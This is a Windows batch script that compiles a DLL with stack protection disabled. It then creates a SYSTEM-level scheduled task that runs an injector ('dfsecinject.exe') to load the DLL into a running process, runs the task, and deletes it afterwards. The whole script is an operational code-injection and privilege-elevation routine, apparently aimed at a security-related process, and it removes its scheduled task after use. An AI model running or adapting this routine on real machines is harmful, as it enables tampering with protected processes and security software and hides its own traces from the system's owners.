@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfgs.cpp /Fe:dfgs.dll /link user32.lib > gs_build.log 2>&1
echo GS=%errorlevel%
type gs_build.log
schtasks /create /tn dfa_gs /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfgs.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_gs
ping -n 15 127.0.0.1 >nul
schtasks /delete /tn dfa_gs /f >nul
type gs.txt
